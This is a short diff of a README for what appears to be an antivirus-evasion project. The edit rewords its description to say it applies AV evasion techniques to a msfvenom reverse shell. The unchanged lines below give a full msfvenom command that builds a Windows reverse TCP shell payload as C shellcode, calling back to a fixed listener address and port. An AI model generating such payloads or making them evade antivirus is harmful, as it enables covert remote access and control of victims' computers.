@@ -1,6 +1,6 @@
 # antivirus-evasion
 
-Applying some AV techniques on a metasploit reverse shell
+Applying some AV evasion techniques on a msfvenom reverse shell.
 
 ```sh
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.58.159 LPORT=9999 -f c
